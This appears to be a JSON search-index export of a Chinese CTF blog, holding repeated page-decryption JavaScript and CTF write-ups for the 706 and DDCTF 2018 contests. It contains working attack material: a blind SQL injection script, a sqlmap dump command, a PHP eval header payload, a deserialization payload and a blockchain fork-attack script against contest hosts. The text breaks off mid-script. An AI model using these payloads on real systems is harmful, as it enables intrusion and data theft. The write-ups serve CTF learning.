[{"title":"通过return_to_dl_resolve技术秒题","date":"2018-08-20T03:47:22.000Z","path":"2018/08/19/return-to-dl-resolve/","text":"function doDecrypt (pwd, onError) { console.log('in doDecrypt'); const txt = document.getElementById('enc_content').innerHTML; let plantext; try { const bytes = CryptoJS.AES.decrypt(txt, pwd); var plaintext = bytes.toString(CryptoJS.enc.Utf8); showMessage('嘿！芝麻开门~~', 5000); } catch(err) { if(onError) { onError(err); } return; } document.getElementById('enc_content').innerHTML = plaintext; document.getElementById('enc_content').style.display = 'block'; document.getElementById('enc_passwd').style.display = 'none'; if(typeof MathJax !== 'undefined') { MathJax.Hub.Queue( ['resetEquationNumbers', MathJax.InputJax.TeX], ['PreProcess', MathJax.Hub], ['Reprocess', MathJax.Hub] ); } }  var onError = function(error) { showMessage(\"嘻嘻嘻，密码不对哦~\", 5000);}; function decrypt() { var passwd = document.getElementById(\"enc_pwd_input\").value; console.log(passwd); doDecrypt(passwd, onError); }","tags":[{"name":"pwn","slug":"pwn","permalink":"https://winter3un.github.io/tags/pwn/"},{"name":"ctf","slug":"ctf","permalink":"https://winter3un.github.io/tags/ctf/"}]},{"title":"2018_807个人赛复盘","date":"2018-08-08T03:39:09.000Z","path":"2018/08/07/20180807/","text":"function doDecrypt (pwd, onError) { console.log('in doDecrypt'); const txt = document.getElementById('enc_content').innerHTML; let plantext; try { const bytes = CryptoJS.AES.decrypt(txt, pwd); var plaintext = bytes.toString(CryptoJS.enc.Utf8); showMessage('嘿！芝麻开门~~', 5000); } catch(err) { if(onError) { onError(err); } return; } document.getElementById('enc_content').innerHTML = plaintext; document.getElementById('enc_content').style.display = 'block'; document.getElementById('enc_passwd').style.display = 'none'; if(typeof MathJax !== 'undefined') { MathJax.Hub.Queue( ['resetEquationNumbers', MathJax.InputJax.TeX], ['PreProcess', MathJax.Hub], ['Reprocess', MathJax.Hub] ); } }  var onError = function(error) { showMessage(\"嘻嘻嘻，密码不对哦~\", 5000);}; function decrypt() { var passwd = document.getElementById(\"enc_pwd_input\").value; console.log(passwd); doDecrypt(passwd, onError); }","tags":[{"name":"writeup","slug":"writeup","permalink":"https://winter3un.github.io/tags/writeup/"},{"name":"ctf","slug":"ctf","permalink":"https://winter3un.github.io/tags/ctf/"}]},{"title":"ctf-web指南","date":"2018-07-31T01:48:54.000Z","path":"2018/07/30/ctf-web/","text":"function doDecrypt (pwd, onError) { console.log('in doDecrypt'); const txt = document.getElementById('enc_content').innerHTML; let plantext; try { const bytes = CryptoJS.AES.decrypt(txt, pwd); var plaintext = bytes.toString(CryptoJS.enc.Utf8); showMessage('嘿！芝麻开门~~', 5000); } catch(err) { if(onError) { onError(err); } return; } document.getElementById('enc_content').innerHTML = plaintext; document.getElementById('enc_content').style.display = 'block'; document.getElementById('enc_passwd').style.display = 'none'; if(typeof MathJax !== 'undefined') { MathJax.Hub.Queue( ['resetEquationNumbers', MathJax.InputJax.TeX], ['PreProcess', MathJax.Hub], ['Reprocess', MathJax.Hub] ); } }  var onError = function(error) { showMessage(\"嘻嘻嘻，密码不对哦~\", 5000);}; function decrypt() { var passwd = document.getElementById(\"enc_pwd_input\").value; console.log(passwd); doDecrypt(passwd, onError); }","tags":[{"name":"web","slug":"web","permalink":"https://winter3un.github.io/tags/web/"}]},{"title":"CTF-RSA破解方式整理","date":"2018-07-10T00:51:05.000Z","path":"2018/07/09/rsa-ctf/","text":"function doDecrypt (pwd, onError) { console.log('in doDecrypt'); const txt = document.getElementById('enc_content').innerHTML; let plantext; try { const bytes = CryptoJS.AES.decrypt(txt, pwd); var plaintext = bytes.toString(CryptoJS.enc.Utf8); showMessage('嘿！芝麻开门~~', 5000); } catch(err) { if(onError) { onError(err); } return; } document.getElementById('enc_content').innerHTML = plaintext; document.getElementById('enc_content').style.display = 'block'; document.getElementById('enc_passwd').style.display = 'none'; if(typeof MathJax !== 'undefined') { MathJax.Hub.Queue( ['resetEquationNumbers', MathJax.InputJax.TeX], ['PreProcess', MathJax.Hub], ['Reprocess', MathJax.Hub] ); } }  var onError = function(error) { showMessage(\"嘻嘻嘻，密码不对哦~\", 5000);}; function decrypt() { var passwd = document.getElementById(\"enc_pwd_input\").value; console.log(passwd); doDecrypt(passwd, onError); }","tags":[{"name":"ctf","slug":"ctf","permalink":"https://winter3un.github.io/tags/ctf/"},{"name":"crypto","slug":"crypto","permalink":"https://winter3un.github.io/tags/crypto/"}]},{"title":"2018 706 writeup","date":"2018-07-09T11:00:43.000Z","path":"2018/07/09/2018-706-wp/","text":"前言706测试的题目，wp简单写下。 Misc1两张图叠加，010处理下就出来了。 Misc2png的长度设置长一点就出flag misc3steg 打开，RGB三个最低色道分别来一次，flag组合下就出来了。 Misc4流量包内有jsfuck编码的密码，log文件内有rar文件，拿密码去解压rar文件，就出flag re1flag直接写在main函数里了。。 re2题目算法似乎有问题，反正我是没解出来，好像有人解出来了- -，真流弊 crypt1直接写出解密脚本 12345678910111213141516171819202122232425262728293031323334353637#-*- coding:utf8 -*-from Crypto.Cipher import AES,DES3from hashlib import md5def encrypt(): flag=open(\"flag.txt\",\"rb\").read().strip() paclen=8-len(flag)%8 flag+=paclen*(chr(paclen)) key1=\"do_you_know_des3\" obj1=DES3.new(key1,DES3.MODE_ECB) s1=obj1.encrypt(flag) key2=\"and_you_know_aes\" iv=md5(key2).digest() obj2=AES.new(key2,AES.MODE_CBC,iv) s2=obj2.encrypt(s1) with open(\"flag.enc\",\"wb\") as f: f.write(s2)def decrypt(): s1=open(\"flag.enc\",\"rb\").read() key2=\"and_you_know_aes\" iv=md5(key2).digest() obj2=AES.new(key2,AES.MODE_CBC,iv) s2=obj2.decrypt(s1) key1=\"do_you_know_des3\" obj1=DES3.new(key1,DES3.MODE_ECB) flag=obj1.decrypt(s2) print flag decrypt() crypt2Coppersmith攻击了解一下。 pwn1静态编译，ROPgadget了解一下。 pwn2根据0ctf2018 babyheap改的题，把off by one改没了，不知道怎么做= = web1-web7全是原题，不会做的话，实验吧刷题了解一下。 web8有waf的报错注入，waf只是为了限制考点，很容易绕过 web9格式化字符串，sqlmap了解一下 sqlmap -r post -p username --prefix &quot;%1$&#39;&quot; --suffix &quot;#&quot; -v3 --technique=T -D ctf -T flag --dump web10命令执行，rctf原题改，getallheaders被禁用了，但是apache_request_headers可以 payload为eval(next(apache_request_headers()));","tags":[{"name":"writeup","slug":"writeup","permalink":"https://winter3un.github.io/tags/writeup/"},{"name":"ctf","slug":"ctf","permalink":"https://winter3un.github.io/tags/ctf/"}]},{"title":"DDCTF-2018  WEB WRITEUP","date":"2018-04-20T05:44:11.000Z","path":"2018/04/19/ddctf-2018/","text":"前言工作需要较强的web安全能力，所以我想通过打ctf的web类题目来提高这方面的水平，以下为这次didictf web类的题解。 web1 非法链接的问题，直接在http头中加入以下键值对绕过1234X-Originating-IP: 123.232.23.245X-Forwarded-For: 123.232.23.245X-Remote-IP: 123.232.23.245X-Remote-Addr: 123.232.23.245 其实也可以配置burp的插件bypass waf（https://www.codewatch.org/blog/?p=408 ） ，来绕过限制正常在客户端浏览。 emmm…明显考察注入，不过这边的注入点比较隐蔽，在author参数这儿，页面上隐藏了输入点，我们可以直接写python脚本通过盲注的手法跑出flag 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import requestsimport timeimport hashlibs = ''for index in range(1,0x20): for i in range(0x30,0x7f): id = \"\" title = \"\" date = \"\" author = \"-1'||if(ord(substr((select secvalue from ctf_key9 limit 0,1),\"+str(index)+\",1))=\"+str(i)+\",0,1)#\" # select * from content where id = ? and author = ' -1' || ' and date = ' = 'a' union ' proxies = &#123;\"http\":\"127.0.0.1:8080\"&#125; data = &#123; \"id\":id, \"title\":title, \"author\":author, \"data\":date, \"button\":\"search\" &#125; t = str(int(time.time())) str0 = 'id='+id+'title='+title+'author='+author+'date='+date+'time='+t+'adrefkfweodfsdpiru' sig = hashlib.sha1(str0).hexdigest() ip = '123.232.23.245' headers = &#123;'X-Originating-IP': ip, 'X-Forwarded-For': ip, 'X-Remote-IP': ip, 'X-Remote-Addr': ip, 'X-Client-IP': ip, \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36\", 'Referer':\"http://123.232.23.245/\" &#125; if len(requests.post(url=\"http://116.85.43.88:8080/NQYPTEMNWRQIYLEP/dfe3ia/index.php?sig=\"+sig+\"&amp;time=\"+str(int(time.time())),data=data,headers=headers,proxies=proxies).content) != 2420: s += chr(i) break print s # print str0 web2web2的难度明显要比web1要高。 点击链接进去后，直接ctrl+u看源码，发现了可疑的链接 将ZmF2aWNvbi5pY28= base64解码后，发现是favicon.ico ，初步判断该api应该存在任意文件下载漏洞。 接下来通过构造web.xml的地址(../../WEB-INF/web.xml —base64&gt;&gt;&gt; Li4vLi4vV0VCLUlORi93ZWIueG1s)，并利用该漏洞，下载该配置文件。 下载完了以后分析该web.xml文件，在文件内发现其他关联的文件，仿照上一步操作，将所有相关的文件都下载到本地分析。 在web.xml中发现该class文件 下载至本地后，用GD-GUI分析发现为flag的加密算法 但是我们缺少关键的email和flag密文，继续寻找相关文件，开了下脑洞，猜测控制器文件FlagController.class,没想到真的有233333 下载下来分析。如图，只要我们给email就给我们加密后的flag 233333 回到首页，发现email。。。 所有条件都齐全了，逆向算法，最后写出了对应的解密脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869import java.io.File;import java.io.FileInputStream;import java.io.IOException;import java.io.InputStream;import java.io.PrintStream;import java.security.InvalidKeyException;import java.security.Key;import java.security.KeyStore;import java.security.PublicKey; import java.security.KeyStoreException;import java.security.NoSuchAlgorithmException;import java.security.SecureRandom;import java.security.UnrecoverableKeyException;import java.security.cert.CertificateException;import java.util.Properties;import java.util.UUID;import javax.crypto.BadPaddingException;import javax.crypto.Cipher;import javax.crypto.IllegalBlockSizeException;import javax.crypto.Mac;import javax.crypto.NoSuchPaddingException;import javax.crypto.spec.SecretKeySpec;import sun.misc.BASE64Decoder; import sun.misc.BASE64Encoder; class decrypt&#123; public static byte[] decryptBASE64(String key) throws Exception &#123; return (new BASE64Decoder()).decodeBuffer(key); &#125; public static void main(String[] args) &#123; try&#123; KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType()); FileInputStream inputStream = new FileInputStream(\"C:\\\\Users\\\\Administrator\\\\Desktop\\\\ddctf\\\\web2\\\\key\\\\sdl.ks\"); keyStore.load(inputStream, \"sdl welcome you !\".substring(0, \"sdl welcome you !\".length() - 1).trim().replace(\" \", \"\").toCharArray()); PublicKey key = keyStore.getCertificate(\"www.didichuxing.com\").getPublicKey(); System.out.println(key); Cipher cipher = Cipher.getInstance(key.getAlgorithm()); cipher.init(2, key); byte[] text = decryptBASE64(\"S1EgULNQ7TlSYnuzagfIe5gfmjYWZRJE7YBSKoaOGmYZ6yjkmbapuNDyQDiUyjV2mKDGm2hnhkgwA6l0qsdvD9uSOjStWMHHYerOZGvk8epWSQ8YYn2pWArUlV7m2e4nV6oqKYYXRMJVO8776JX00OY/MmUeaj6XoAHk4cWar3BpwAfLw3hsUYDM1NoVjBkPy/SS/DHDhf9YsM+3kF3hNmyUc7tqTvvb/1gzovigpmoAIzc8FDxeaBprG+084bkoIiMlBs8cUyUyZq4x7PD6jvVkb00kHUeVERPFIVxlbS1ph4jS+Wy6yd3GNaYe0wUUwoxd/5MiSG4Z4l4miFX8SQ==\"); byte[] doFinal = cipher.doFinal(text); System.out.println(byte2hex(doFinal)); &#125; catch(Exception e) &#123; System.out.println(\"e:\"+e); &#125; &#125; public static String byte2hex(byte[] b) &#123; StringBuilder hs = new StringBuilder(); for (int n = 0; (b != null) &amp;&amp; (n &lt; b.length); n++) &#123; String stmp = Integer.toHexString(b[n] &amp; 0xFF); if (stmp.length() == 1) &#123; hs.append('0'); &#125; hs.append(stmp); &#125; return hs.toString().toUpperCase(); &#125;&#125; web3一开始以为是宽字节注入，试了很多方式都没试出来，突然看到了提示，如图，链接过去是一篇关于big编码说明的文件。。。 那思路很明确了，找一个big编码的字，第二位字节为 0x5c 即 \\ 转义掉gpc生成的 \\ 最后成功逃逸单引号 \\\\&#39; 接下来就是常规注入了，注入完毕后发现，并没有flag。。。只有一个备份文件。。。算了，下载下来备份文件代码审计吧。 发现竟然有个api 接受一个字符串并反序列，直接就get到了考点，构造反序列化执行链，获取flag 这个反序列执行链很简单 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?class Flag&#123; public $sql; // public function __construct() &#123; $this-&gt;sql=new SQL(); &#125;&#125;class SQL&#123; public function FlagGet($user) &#123; return \"\"; &#125;&#125;class Test&#123; public $user_uuid; public $fl;&#125;$t = new Test();$t-&gt;fl = new Flag();$t-&gt;user_uuid = \"c09764a2-8d31-4643-907a-5d663b9348dc\";echo serialize($t);?&gt; 生成 O:4:&quot;Test&quot;:2:{s:9:&quot;user_uuid&quot;;s:36:&quot;c09764a2-8d31-4643-907a-5d663b9348dc&quot;;s:2:&quot;fl&quot;;O:4:&quot;Flag&quot;:1:{s:3:&quot;sql&quot;;O:3:&quot;SQL&quot;:0:{}}} 不过要把类名称改成&quot;Index\\Helper\\Flag&quot;, &quot;Index\\Helper\\SQL&quot;,&quot;Index\\Helper\\Test&quot;这种形式才能在远程环境执行。最后的payload为 1O:17:&quot;Index\\Helper\\Test&quot;:2:&#123;s:9:&quot;user_uuid&quot;;s:36:&quot;c09764a2-8d31-4643-907a-5d663b9348dc&quot;;s:2:&quot;fl&quot;;O:17:&quot;Index\\Helper\\Flag&quot;:1:&#123;s:3:&quot;sql&quot;;O:16:&quot;Index\\Helper\\SQL&quot;:0:&#123;&#125;&#125;&#125; web4有关于区块链的代码审计，也是第一次接触到区块链的具体原理，分析了一天，收获蛮大的，这边其实可以利用区块链分叉攻击来实现bank未被hack掉的区块链链路（只要这个链路比被hack掉的链路长就可以了。） mini区块链源码如下（对学习区块链还是挺有意思）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335# -*- encoding: utf-8 -*-# written in python 2.7import hashlib, json, rsa, uuidfrom flask import Flask, session, redirect, url_for, escape, requestimport requestsapp = Flask(__name__)app.secret_key = '*********************'url_prefix = '/b9744af30897e'def FLAG(): return 'Here is your flag: DDCTF&#123;******************&#125;'def hash(x): return hashlib.sha256(hashlib.md5(x).digest()).hexdigest() def hash_reducer(x, y): return hash(hash(x)+hash(y)) def has_attrs(d, attrs): if type(d) != type(&#123;&#125;): raise Exception(\"Input should be a dict/JSON\") for attr in attrs: if attr not in d: raise Exception(\"&#123;&#125; should be presented in the input\".format(attr))EMPTY_HASH = '0'*64def addr_to_pubkey(address): return rsa.PublicKey(int(address, 16), 65537) def pubkey_to_address(pubkey): assert pubkey.e == 65537 hexed = hex(pubkey.n) if hexed.endswith('L'): hexed = hexed[:-1] if hexed.startswith('0x'): hexed = hexed[2:] return hexed def gen_addr_key_pair(): pubkey, privkey = rsa.newkeys(384) return pubkey_to_address(pubkey), privkeybank_address, bank_privkey = gen_addr_key_pair()hacker_address, hacker_privkey = gen_addr_key_pair()shop_address, shop_privkey = gen_addr_key_pair()shop_wallet_address, shop_wallet_privkey = gen_addr_key_pair()my_address, my_privkey = gen_addr_key_pair()def sign_input_utxo(input_utxo_id, privkey): return rsa.sign(input_utxo_id, privkey, 'SHA-1').encode('hex') def hash_utxo(utxo): return reduce(hash_reducer, [utxo['id'], utxo['addr'], str(utxo['amount'])]) def create_output_utxo(addr_to, amount): utxo = &#123;'id': str(uuid.uuid4()), 'addr': addr_to, 'amount': amount&#125; utxo['hash'] = hash_utxo(utxo) return utxo def hash_tx(tx): return reduce(hash_reducer, [ reduce(hash_reducer, tx['input'], EMPTY_HASH), reduce(hash_reducer, [utxo['hash'] for utxo in tx['output']], EMPTY_HASH) ]) def create_tx(input_utxo_ids, output_utxo, privkey_from=None): tx = &#123;'input': input_utxo_ids, 'signature': [sign_input_utxo(id, privkey_from) for id in input_utxo_ids], 'output': output_utxo&#125; tx['hash'] = hash_tx(tx) return tx def hash_block(block): return reduce(hash_reducer, [block['prev'], block['nonce'], reduce(hash_reducer, [tx['hash'] for tx in block['transactions']], EMPTY_HASH)]) def create_block(prev_block_hash, nonce_str, transactions): if type(prev_block_hash) != type(''): raise Exception('prev_block_hash should be hex-encoded hash value') nonce = str(nonce_str) if len(nonce) &gt; 128: raise Exception('the nonce is too long') block = &#123;'prev': prev_block_hash, 'nonce': nonce, 'transactions': transactions&#125; block['hash'] = hash_block(block) return block def find_blockchain_tail(): return max(session['blocks'].values(), key=lambda block: block['height']) def calculate_utxo(blockchain_tail): curr_block = blockchain_tail blockchain = [curr_block] while curr_block['hash'] != session['genesis_block_hash']: curr_block = session['blocks'][curr_block['prev']] blockchain.append(curr_block) blockchain = blockchain[::-1] utxos = &#123;&#125; for block in blockchain: for tx in block['transactions']: for input_utxo_id in tx['input']: del utxos[input_utxo_id] for utxo in tx['output']: utxos[utxo['id']] = utxo return utxos def calculate_balance(utxos): balance = &#123;bank_address: 0, hacker_address: 0, shop_address: 0&#125; for utxo in utxos.values(): if utxo['addr'] not in balance: balance[utxo['addr']] = 0 balance[utxo['addr']] += utxo['amount'] return balancedef verify_utxo_signature(address, utxo_id, signature): try: return rsa.verify(utxo_id, signature.decode('hex'), addr_to_pubkey(address)) except: return Falsedef append_block(block, difficulty=int('f'*64, 16)): has_attrs(block, ['prev', 'nonce', 'transactions']) if type(block['prev']) == type(u''): block['prev'] = str(block['prev']) if type(block['nonce']) == type(u''): block['nonce'] = str(block['nonce']) # print session['blocks'] # print ['prev'] if block['prev'] not in session['blocks']: raise Exception(\"unknown parent block\") tail = session['blocks'][block['prev']] utxos = calculate_utxo(tail) if type(block['transactions']) != type([]): raise Exception('Please put a transaction array in the block') new_utxo_ids = set() for tx in block['transactions']: has_attrs(tx, ['input', 'output', 'signature']) for utxo in tx['output']: has_attrs(utxo, ['amount', 'addr', 'id']) if type(utxo['id']) == type(u''): utxo['id'] = str(utxo['id']) if type(utxo['addr']) == type(u''): utxo['addr'] = str(utxo['addr']) if type(utxo['id']) != type(''): raise Exception(\"unknown type of id of output utxo\") if utxo['id'] in new_utxo_ids: raise Exception(\"output utxo of same id(&#123;&#125;) already exists.\".format(utxo['id'])) new_utxo_ids.add(utxo['id']) if type(utxo['amount']) != type(1): raise Exception(\"unknown type of amount of output utxo\") if utxo['amount'] &lt;= 0: raise Exception(\"invalid amount of output utxo\") if type(utxo['addr']) != type(''): raise Exception(\"unknown type of address of output utxo\") try: addr_to_pubkey(utxo['addr']) except: raise Exception(\"invalid type of address(&#123;&#125;)\".format(utxo['addr'])) utxo['hash'] = hash_utxo(utxo) tot_output = sum([utxo['amount'] for utxo in tx['output']]) if type(tx['input']) != type([]): raise Exception(\"type of input utxo ids in tx should be array\") if type(tx['signature']) != type([]): raise Exception(\"type of input utxo signatures in tx should be array\") if len(tx['input']) != len(tx['signature']): raise Exception(\"lengths of arrays of ids and signatures of input utxos should be the same\") tot_input = 0 tx['input'] = [str(i) if type(i) == type(u'') else i for i in tx['input']] tx['signature'] = [str(i) if type(i) == type(u'') else i for i in tx['signature']] for utxo_id, signature in zip(tx['input'], tx['signature']): if type(utxo_id) != type(''): raise Exception(\"unknown type of id of input utxo\") print utxos if utxo_id not in utxos: raise Exception(\"invalid id of input utxo. Input utxo(&#123;&#125;) does not exist or it has been consumed.\".format(utxo_id)) utxo = utxos[utxo_id] if type(signature) != type(''): raise Exception(\"unknown type of signature of input utxo\") if not verify_utxo_signature(utxo['addr'], utxo_id, signature): raise Exception(\"Signature of input utxo is not valid. You are not the owner of this input utxo(&#123;&#125;)!\".format(utxo_id)) tot_input += utxo['amount'] del utxos[utxo_id] if tot_output &gt; tot_input: raise Exception(\"You don't have enough amount of DDCoins in the input utxo! &#123;&#125;/&#123;&#125;\".format(tot_input, tot_output)) tx['hash'] = hash_tx(tx) block = create_block(block['prev'], block['nonce'], block['transactions']) # print block['hash'] block_hash = int(block['hash'], 16) # print block_hash # print difficulty if block_hash &gt; difficulty: raise Exception('Please provide a valid Proof-of-Work') block['height'] = tail['height']+1 if len(session['blocks']) &gt; 50: raise Exception('The blockchain is too long. Use ./reset to reset the blockchain') if block['hash'] in session['blocks']: raise Exception('A same block is already in the blockchain') session['blocks'][block['hash']] = block session.modified = True def init(): if 'blocks' not in session: session['blocks'] = &#123;&#125; session['your_diamonds'] = 0 # First, the bank issued some DDCoins ... total_currency_issued = create_output_utxo(bank_address, 1000000) # print \"lalala:\"+str(total_currency_issued) genesis_transaction = create_tx([], [total_currency_issued]) # create DDCoins from nothing # print genesis_transaction genesis_block = create_block(EMPTY_HASH, 'The Times 03/Jan/2009 Chancellor on brink of second bailout for bank', [genesis_transaction]) session['genesis_block_hash'] = genesis_block['hash'] genesis_block['height'] = 0 session['blocks'][genesis_block['hash']] = genesis_block # Then, the bank was hacked by the hacker ... handout = create_output_utxo(hacker_address, 999999) reserved = create_output_utxo(bank_address, 1) transferred = create_tx([total_currency_issued['id']], [handout, reserved], bank_privkey) # print transferred second_block = create_block(genesis_block['hash'], 'HAHA, I AM THE BANK NOW!', [transferred]) append_block(second_block) # Can you buy 2 diamonds using all DDCoins? # print transferred third_block = create_block(second_block['hash'], 'a empty block', []) append_block(third_block) # final # handout2 = create_output_utxo(hacker_address, 1) # transferred = create_tx([total_currency_issued['id']], [handout2], bank_privkey) # fake_second_block = create_block(genesis_block['hash'], \"aaaa\", []) # requests.post(url=\"http://127.0.0.1:5000/b9744af30897e/create_transaction\",data=json.dumps(fake_second_block),proxies = &#123;\"http\":\"http://127.0.0.1:8080\"&#125;,headers=&#123;\"Content-Type\":\"application/json\"&#125;) # append_block(fake_second_block) # fake_third_block = create_block(fake_second_block['hash'], \"aaaa\", []) # append_block(fake_third_block) # fake_fourth_block = create_block(fake_third_block['hash'], \"aaaa\", []) # append_block(fake_fourth_block) # try: # print \"start attack!\" # x = 0 # while x &lt;0xfffffff: # fouth_block = create_block(third_block['hash'], str(x), [transferred]) # if int(fouth_block[\"hash\"],16)&lt;= DIFFICULTY: # print fouth_block # break # x+=1 # except: # print \"end at \",hex(x) # print \"end!\" # append_block(fouth_block) def get_balance_of_all(): init() tail = find_blockchain_tail() utxos = calculate_utxo(tail) return calculate_balance(utxos), utxos, tail @app.route(url_prefix+'/')def homepage(): balance, utxos, _ = get_balance_of_all() genesis_block_info = 'hash of genesis block: ' + session['genesis_block_hash'] addr_info = 'the bank\\'s addr: ' + bank_address + ', the hacker\\'s addr: ' + hacker_address + ', the shop\\'s addr: ' + shop_address balance_info = 'Balance of all addresses: ' + json.dumps(balance) utxo_info = 'All utxos: ' + json.dumps(utxos) blockchain_info = 'Blockchain Explorer: ' + json.dumps(session['blocks']) view_source_code_link = \"&lt;a href='source_code'&gt;View source code&lt;/a&gt;\" return '&lt;br /&gt;&lt;br /&gt;\\r\\n\\r\\n'.join([view_source_code_link, genesis_block_info, addr_info, balance_info, utxo_info, blockchain_info]) @app.route(url_prefix+'/flag')def getFlag(): init() if session['your_diamonds'] &gt;= 2: return FLAG() return 'To get the flag, you should buy 2 diamonds from the shop. You have &#123;&#125; diamonds now. To buy a diamond, transfer 1000000 DDCoins to '.format(session['your_diamonds']) + shop_address def find_enough_utxos(utxos, addr_from, amount): collected = [] for utxo in utxos.values(): if utxo['addr'] == addr_from: amount -= utxo['amount'] collected.append(utxo['id']) if amount &lt;= 0: return collected, -amount raise Exception('no enough DDCoins in ' + addr_from) def transfer(utxos, addr_from, addr_to, amount, privkey): input_utxo_ids, the_change = find_enough_utxos(utxos, addr_from, amount) outputs = [create_output_utxo(addr_to, amount)] if the_change != 0: outputs.append(create_output_utxo(addr_from, the_change)) return create_tx(input_utxo_ids, outputs, privkey) @app.route(url_prefix+'/5ecr3t_free_D1diCoin_b@ckD00r/&lt;string:address&gt;')def free_ddcoin(address): balance, utxos, tail = get_balance_of_all() if balance[bank_address] == 0: return 'The bank has no money now.' try: address = str(address) addr_to_pubkey(address) # to check if it is a valid address transferred = transfer(utxos, bank_address, address, balance[bank_address], bank_privkey) new_block = create_block(tail['hash'], 'b@cKd00R tr1993ReD', [transferred]) append_block(new_block) return str(balance[bank_address]) + ' DDCoins are successfully sent to ' + address except Exception, e: return 'ERROR: ' + str(e)DIFFICULTY = int('00000' + 'f' * 59, 16)@app.route(url_prefix+'/create_transaction', methods=['POST'])def create_tx_and_check_shop_balance(): init() try: # print request.data block = json.loads(request.data) append_block(block, DIFFICULTY) msg = 'transaction finished.' except Exception, e: return str(e) balance, utxos, tail = get_balance_of_all() if balance[shop_address] == 1000000: # when 1000000 DDCoins are received, the shop will give you a diamond session['your_diamonds'] += 1 # and immediately the shop will store the money somewhere safe. transferred = transfer(utxos, shop_address, shop_wallet_address, balance[shop_address], shop_privkey) new_block = create_block(tail['hash'], 'save the DDCoins in a cold wallet', [transferred]) append_block(new_block) msg += ' You receive a diamond.' return msg # if you mess up the blockchain, use this to reset the blockchain.@app.route(url_prefix+'/reset')def reset_blockchain(): if 'blocks' in session: del session['blocks'] if 'genesis_block_hash' in session: del session['genesis_block_hash'] return 'reset.' @app.route(url_prefix+'/source_code')def show_source_code(): source = open('serve.py', 'r') html = '' for line in source: html += line.replace('&amp;','&amp;amp;').replace('\\t', '&amp;nbsp;'*4).replace(' ','&amp;nbsp;').replace('&lt;', '&amp;lt;').replace('&gt;','&amp;gt;').replace('\\n', '&lt;br /&gt;') source.close() return html if __name__ == '__main__': app.run(debug=False, host='0.0.0.0') payload代码如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586from server import *import requestsimport rex = 0ip = \"116.85.48.107\"port = \"5000\"r = requests.get(\"http://\"+ip+\":\"+port+\"/b9744af30897e/\")genesis_block = re.findall(r'genesis block: (.*)&lt;br /&gt;&lt;br /&gt;',r.content)[0]shop_addr = re.findall(r\"the shop's addr: (.*)&lt;br /&gt;&lt;br /&gt;\",r.content)[0]cookie = r.headers[\"Set-Cookie\"]# print shop_addr# print genesis_blockblock_hash = genesis_blocktry: print \"start attack!\" for i in range(0,3): while x &lt;0xfffffff: new_block = create_block(block_hash, str(x), []) x+=1 if int(new_block[\"hash\"],16) &lt;= DIFFICULTY: r = requests.post(url=\"http://\"+ip+\":\"+port+\"/b9744af30897e/create_transaction\",data=json.dumps(new_block),proxies = &#123;\"http\":\"http://127.0.0.1:8080\"&#125;,headers=&#123;\"Cookie\":cookie,\"Content-Type\":\"application/json\"&#125;) cookie = r.headers[\"Set-Cookie\"] block_hash = new_block['hash'] break r = requests.get(url=\"http://\"+ip+\":\"+port+\"/b9744af30897e/5ecr3t_free_D1diCoin_b@ckD00r/\"+shop_addr,proxies = &#123;\"http\":\"http://127.0.0.1:8080\"&#125;,headers=&#123;\"Cookie\":cookie&#125;) cookie = r.headers[\"Set-Cookie\"] block_hash = genesis_blockexcept Exception,e: print \"end at \",hex(x) print eprint \"end!\"try: print \"start attack!\" for i in range(0,5): while x &lt;0xfffffff: new_block = create_block(block_hash, str(x), []) x+=1 if int(new_block[\"hash\"],16) &lt;= DIFFICULTY: r = requests.post(url=\"http://\"+ip+\":\"+port+\"/b9744af30897e/create_transaction\",data=json.dumps(new_block),proxies = &#123;\"http\":\"http://127.0.0.1:8080\"&#125;,headers=&#123;\"Cookie\":cookie,\"Content-Type\":\"application/json\"&#125;) cookie = r.headers[\"Set-Cookie\"] block_hash = new_block['hash'] break r = requests.get(url=\"http://\"+ip+\":\"+port+\"/b9744af30897e/5ecr3t_free_D1diCoin_b@ckD00r/\"+shop_addr,proxies = &#123;\"http\":\"http://127.0.0.1:8080\"&#125;,headers=&#123;\"Cookie\":cookie&#125;) cookie = r.headers[\"Set-Cookie\"] block_hash = genesis_blockexcept Exception,e: print \"end at \",hex(x) print eprint \"end!\"while x &lt;0xfffffff: new_block = create_block(block_hash, str(x), []) x+=1 if int(new_block[\"hash\"],16) &lt;= DIFFICULTY: r = requests.post(url=\"http://\"+ip+\":\"+port+\"/b9744af30897e/create_transaction\",data=json.dumps(new_block),proxies = &#123;\"http\":\"http://127.0.0.1:8080\"&#125;,headers=&#123;\"Cookie\":cookie,\"Content-Type\":\"application/json\"&#125;) cookie = r.headers[\"Set-Cookie\"] block_hash = new_block['hash'] break print requests.get(url=\"http://\"+ip+\":\"+port+\"/b9744af30897e/flag\",proxies = &#123;\"http\":\"http://127.0.0.1:8080\"&#125;,headers=&#123;\"Cookie\":cookie&#125;).content web5看到提示，直接下载源码，代码审计ing 发现首页存在sql注入，但是需要admin的权限才能进行注入，而注册成为admin则需要一个code，则个code由str_shuffle这个关键函数函数生成。 通过谷歌搜索这个函数的相关缺陷，发现这个函数内部是由rand()函数来决定随机性的，那么接下来就好办了。 rand()函数是一个可预测的伪随机函数，具体可以参考 http://www.yqxiaojunjie.com/index.php/archives/275/ 再分析下 RAND_RANGE 的构成 于是根据str_shuffle的源码，来实现python版本的str_shuffle，写出对应的预测算法。python脚本如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import requestsimport res = requests.Session()l = [0]*200for i in range(0,50): l[i] = re.findall(r'csrf\" 